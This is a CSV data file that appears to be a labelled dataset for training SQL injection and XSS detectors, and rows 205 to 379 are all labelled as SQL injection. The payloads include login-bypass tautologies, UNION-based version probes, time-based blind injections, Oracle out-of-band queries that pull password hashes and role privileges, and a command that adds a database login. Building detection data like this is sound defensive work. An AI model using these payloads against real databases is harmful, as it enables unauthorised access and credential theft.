index,payload,sqli,xss
205," select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1,0
206,admin'/*,1,0
207," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1,0
208,||UTL_HTTP.REQUEST,1,0
209," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,0
210," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1,0
211,"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1,0
212," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1,0
213," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1,0
214,select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1,0
215,1 uni/**/on select all from where,1,0
216," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1,0
217," select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1,0
218,admin'  )   or '1'  =  '1'#,1,0
219,||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1,0
220,or '7659'  =  '7659,1,0
221," select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1,0
222," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1,0
223," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,0
224," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1,0
225,or true--,1,0
226," select * from users where id  =  1 union select !<1,version  (    )   -- 1",1,0
227," select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1,0
228," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",1,0
229,""" or true--",1,0
230,select * from users where id  =  1. or 1  =  1 -- 1,1,0
231," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1,0
232," select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1,0
233,â or 3  =  3 --,1,0
234, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1,0
235," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1,0
236," select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1,0
237," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1,0
238," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1,0
239," select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1,0
240, or uid like '%,1,0
241,select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1,0
242," select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1,0
243," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",1,0
244," select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1,0
245," select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1,0
246,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1,0
247," select * from users where id  =  '1' union select \,@@VERSION -- 1'",1,0
248,0 or 1  =  1,1,0
249,select * from users where id  =  1 &@ or 1  =  1 -- 1,1,0
250,"admin""  )   or ""1""  =  ""1",1,0
251,select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1,0
252," select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1,0
253," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,0
254," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,0
255,select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1,0
256,select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1,0
257,""" or """"*""",1,0
258,"hi or 1  =  1 --""",1,0
259," select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1,0
260," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,0
261," select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1,0
262,select * from information_schema.tables--,1,0
263,select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1,0
264,   (  select top 1,1,0
265,Ã½ or 1  =  1 --,1,0
266,a' --,1,0
267, or 1  =  1 /*,1,0
268," select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1,0
269," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1,0
270,--,1,0
271,"exec sp_addlogin 'name' , 'password'",1,0
272," select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1,0
273,0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1,0
274," select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1,0
275," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1,0
276,group by userid having 1  =  1--,1,0
277," select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1,0
278,select * from users where id  =  1 *1 or 1  =  1 -- 1,1,0
279," select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1,0
280,‘ or 1  =  1 --,1,0
281," select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1,0
282,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,0
283,or 'a'  =  'a,1,0
284,declare @s varchar  (  22  )   select @s   = ,1,0
285," select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1,0
286," select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1,0
287," select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1,0
288,@variable,1,0
289,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1,0
290," select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,0
291," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,0
292," select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1,0
293," select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1,0
294, and 1 in   (  select var from temp  )  --,1,0
295," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1,0
296," select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1,0
297," select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1,0
298,or x  =  x,1,0
299,or a  =  a,1,0
300,or '1'  =  '1,1,0
301," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1,0
302,   )    )    or    (    (   'x'   )    )     =     (    (   'x,1,0
303," select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1,0
304," select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1,0
305," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,0
306,select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1,0
307," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1,0
308," select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1,0
309," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1,0
310," select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1,0
311,a' or 1  =  1--,1,0
312, )   or   (  a  =  a,1,0
313,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1,0
314," select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1,0
315," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1,0
316,-- &password  = ,1,0
317,select * from users where id  =  1 <@. or 1  =  1 -- 1,1,0
318," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1,0
319," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1,0
320," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,0
321, or '1'  =  '1,1,0
322,admin' or 1  =  1,1,0
323," select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1,0
324," select * from users where id  =  1 union select @||1,version  (    )   -- 1",1,0
325," select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1,0
326," select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1,0
327," union select * from users where login   =   char  (  114,111,111,116  )  ;",1,0
328," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1,0
329, or 1  =  1--,1,0
330," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,0
331,pg_sleep  (  __TIME__  )  --,1,0
332,‘ or 3  =  3 --,1,0
333," select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1,0
334," select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1,0
335," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1,0
336,"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,0
337, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,1,0
338," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,0
339,""" or """" """,1,0
340,delete,1,0
341, or 1  =  1 --,1,0
342,1' and non_existant_table   =   '1,1,0
343," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1,0
344," select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1,0
345,declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1,0
346," select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1,0
347," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1,0
348," select * from users where id  =  1 union select @<@,version  (    )   -- 1",1,0
349," select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1,0
350, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1,0
351," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,0
352,select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1,0
353," select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1,0
354," select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1,0
355,UNION ALL SELECT,1,0
356," select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1,0
357,select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1,0
358," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0
359,x' or full_name like '%bob%,1,0
360, or 2 > 1,1,0
361,select * from users where id  =  1.*1 or 1  =  1 -- 1,1,0
362,"""  )   or pg_sleep  (  __TIME__  )  --",1,0
363, ',1,0
364," select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",1,0
365," select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1,0
366,select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,1,0
367, )   or sleep  (  __TIME__  )    =  ',1,0
368,sleep 50',1,0
369," select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,0
370,select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1,0
371," select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1,0
372,or sleep  (  __TIME__  )    =  ',1,0
373," select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1,0
374," select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1,0
375," select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1,0
376," select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1,0
377," select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1,0
378,or 2 > 1,1,0
379,anything' OR 'x'  =  'x,1,0
